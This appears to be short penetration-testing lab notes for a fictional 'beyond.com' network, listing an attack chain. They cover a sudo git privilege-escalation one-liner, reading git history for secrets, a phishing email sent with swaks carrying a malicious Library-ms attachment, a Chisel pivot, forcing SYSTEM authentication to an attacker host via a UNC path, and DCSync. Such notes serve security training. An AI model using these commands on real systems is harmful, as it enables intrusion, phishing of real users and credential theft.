#box

- Used Git to escalate privilege(**sudo -l**)
```bash
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x
```

- Git Abuse by going to the web directory and using below
```bash
git log
```
- Checking the interesting Commit in the log
```bash
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
```

- Phishing the users using WeBDa, and use SWAKS to send the email.
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
- Discovered a pivot and started a Chisel on the pivot point and used Firefox+Foxyproxy to browse it.
-  Admin page was in http://internalsrv1.beyond.com/wordpress/wp-login
- Abused a backup plugin to authenticate to KALI as SYSTEM 
```
//192.168.119.5/test
```
- Used DCSync to get the Administrator hash